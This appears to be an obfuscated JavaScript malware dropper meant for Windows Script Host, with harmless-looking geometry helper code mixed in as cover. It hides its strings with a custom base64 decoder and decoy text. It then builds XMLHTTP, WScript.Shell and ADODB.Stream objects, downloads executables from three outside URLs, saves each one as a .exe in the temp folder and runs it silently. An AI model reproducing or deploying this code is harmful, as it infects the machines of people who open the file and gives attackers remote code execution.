var satin = 0;
var sellers = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  moments = [];
var anderson = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function kneeled(roadway) {
	translations = roadway;
	for (var i in anderson){translations = translations.replace(i, anderson[i]);}
    return translations;
};

var maintaining = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.kneeled4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("offer").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = sellers[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = sellers[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = sellers[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = sellers[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var spontaneity ="offerJVofferRFTVofferAl".kneeled4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var searched = "offerQWofferN0aXZofferlWE9iaoffermVjdA=offer=".kneeled4();
String.prototype.kneeled2 = function () {
    var unconcerned = {
        terracotta: this
    };
    unconcerned.expression = unconcerned.terracotta["c3Vic3RyaW5n".kneeled4()](satin, maintaining);
    return unconcerned.expression;
};

var stone ="offerRXhwYW5offerkRW52aXofferJvbm1lbnRTdHJofferpbmdz".kneeled4();
var Native = function(options){
	
};
var inertia = [searched, stone,spontaneity,  ""+"."+("windward","paraguay","dormitory","hitting","strikes","paintball","experiments","shield","exe"), "UnVu".kneeled4(), kneeled("M"+"SX"+"ML"+("neighbors","secede","flexibility","movies","unavailing","jaguar","pique","2.")+"|M"+"LH"+"TT"+("deafness","trenchant","octavo","palatable","frequently","poniard","chevrolet","tinker","P>")+"WU"+("ranking","amicable","upgrading","outwit","characterize","hesse","gusto","cr")+("applying","initiated","dislocation","involved","casino","interrogation","regarded","capsized","ip")+"t:"+("dimple","penis","illegal","pakistan","television","forever","capitol","enabled","Sh")+"ell")];
seller = "_F2_";
var denial = this[inertia.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
dXjSWGbzLMv = "SyqNcDJ";
initiated = (("halter", "transcendental", "davidson", "civilian", "greenwich", "twitching", "purchasing", "pMcLxplL") + "CrSglYCPKa").kneeled2();
normal = (("alumina", "fishy", "administrators", "redolent", "forego", "seekers", "jewel", "significance", "breton", "smBcsnByEU") + "fprCtkblK").kneeled2();
  
    String.prototype.afghan = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var draws = inertia.pop().split(">");

nickname = "b3Blbg==".kneeled4();
var chemistry = new denial(draws[1]);
LTrWtSocT = "_F3_";
var meditation = new denial(draws[0]);
var altered = chemistry[inertia.shift()](inertia.shift());
MFWAxq = "_F5_";
weasel = (("palmy", "nicer", "tawdry", "physiology", "EzcbVxGKIxVP") + "QfwbBCRNA").kneeled2();

var archibald = inertia.shift();
var gaudy = inertia.shift();
function rigged(changelog, contrast) {

    try {
        var nikon = altered + "/" + contrast ;
		nikon = nikon+ archibald;
            meditation[nickname](("foreground","vicissitudes","G" + weasel) + ("lynching","spirituality","lucre","tenfold","T"), changelog, false);
       
    YvVrkeXum = "_F7_";
    meditation[normal + ("options","braced","end")]();
	var canada=(WScript+"initiated"=="V2luZG93cyBTY3JpcHQgSG9zdA==".kneeled4()+"initiated")&&meditation["c3RhdHVz".kneeled4()] +""=="MjAw".kneeled4()&&typeof(KYecnufM)==="undefined";
	lQHNgR = "_F8_";
    if (canada) {
		
        var labeled = new denial((("contributor","madhouse","manifesting","bacterial","posted","condoned","creation","inflation","A")+("raleigh","inter","flaccid","strut","bravado","adventures","jocular","refrigerator","SEOO")+"DB"+("piano","gratis","characterise","whitening","oblique","grumble","pointing",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        labeled[nickname]();
        rMOMfdmzr = "_F9_";
        labeled.type = maintaining;
        LkfuVcF = "_F10_";
        labeled["d3JpdGU=".kneeled4()](meditation[("mammal","trash","suddenly","frosted","competition","awesome","sixtytwo","")+"R"+"es"+"pon"+anderson['U'].toLowerCase()+"e"+"Qm9keQ==".kneeled4()]);
        fwFKdIuUQbt = "_F11_";
        labeled[(initiated + "o"+("aerial","bulgaria","indemnity","distaff","rated","amass","verizon","impressive","00")+("explosive","crest","granddaughter","fabrication","bituminous","tracker","resulting","8i")+"tion").replace("0"+("pillow","augment","coherence","suspected","translators","contributing","instructions","08"), normal)] = 0;
        gwenjPjHPo = "_F12_";
        labeled[("experiment","remission","inspections","congress","republic","impurity","yemen","s")+"aveT"+"oF"+"ile"](nikon, 2);
        DFdAkEEiaHv = "_F13_";
        labeled.close();
        qSGJgsklkgE = "_F14_";
		chemistry[gaudy](nikon, maintaining, true);
    }
} catch (ofQkfRW) { };

    Qyceah = "_F15_";
}
try{
rigged("aHR0cDovLw==".kneeled4()+"\u007A\u0076\u0074\u002E\u0061\u0062\u006F\u006B\u002E\u0072"+"\u0075\u002F\u0032\u0033\u0072\u0032\u0033\u0066\u0034\u0032" + "?pmStfKx=uBgdpFcMxb","leNtchKniQQ");}catch(JXjTYrLzz){}

try{
rigged("aHR0cDovLw==".kneeled4()+"\u0072\u0065\u006C\u0069\u0076\u0065\u002D\u0063\u006C\u0065\u0061\u006E"+"\u002E\u0072\u0075\u002F\u0033\u0034\u0074\u0067\u0074\u0062\u0076\u0063\u0071" + "?rwIXOHBOLD=gVeBSP","uwoVCYw");}catch(fKduKB){}
rigged("aHR0cDovLw==".kneeled4()+"\u0067\u006F\u006C\u0064\u0065\u006E\u0070\u0061\u0067\u0065\u0073\u002E"+"\u0075\u0061\u002F\u0034\u0079\u0035\u0033\u0074\u0032\u0066\u0064\u0067\u0072" + "?uMqKdscK=fmzCcfsg","zfcBuTIBJ");
   QKrRzMAqk = "_F16_";
   